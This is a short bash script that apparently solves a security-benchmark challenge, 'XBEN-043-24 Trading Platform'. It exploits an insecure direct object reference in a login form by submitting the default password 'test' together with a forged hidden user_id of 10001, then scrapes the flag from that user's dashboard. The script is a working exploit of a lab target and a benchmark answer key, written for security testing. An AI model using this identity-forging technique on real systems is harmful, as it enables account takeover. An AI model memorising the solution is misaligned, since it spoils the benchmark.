#!/usr/bin/env bash
# XBEN-043-24 — "Trading Platform" variant (tags: idor, default_credentials)
#
# The login form carries a hidden `user_id` alongside the username, and the
# handler verifies the *password* against the username while setting the session
# to whatever `user_id` was posted. Authentication and identity come from two
# different fields, and only one of them is checked.
#
# So: prove you know `test`'s password, and become user 10001, whose profile
# holds the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben043-$$"
VICTIM="${2:-10001}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/password/test' \
    --set 'form.password=test' --set "form.user_id=$VICTIM" \
    --session "$SESSION" >/dev/null
"$H5I" browser navigate "$URL/dashboard" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
